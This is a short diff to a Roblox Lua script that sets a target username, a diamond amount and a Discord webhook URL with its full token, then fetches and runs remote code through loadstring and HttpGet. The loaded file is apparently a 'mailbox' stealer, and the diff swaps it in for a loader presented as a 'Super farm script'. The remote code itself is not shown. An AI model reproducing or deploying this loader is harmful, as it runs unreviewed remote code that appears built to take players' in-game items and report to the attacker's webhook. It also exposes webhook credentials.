@@ -1,7 +1,7 @@
-_G.Username = "thinhblox1290"
+_G.Username = "thinhblox1290" 
 
-_G.HubName = "Super farm script"
+_G.Diamonds = 100000
 
-_G.WebhookUrl = "discord.com/api/webhooks/1107856183131377714/3fhvcUm1yMx8bB5ARgbk5ja2XTfTH8dJ__Jh58bf2eAlDwg_VKroNKFutnF3V4UE5C3b"
+_G.Webhook = "https://discord.com/api/webhooks/1107319474945798144/OD_Za12hB0_V29E3yHmHBgRCsbNkovHPB9fJpHZAnTYZsSnRfKQfmjA_cSfAeo7jzZ58"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
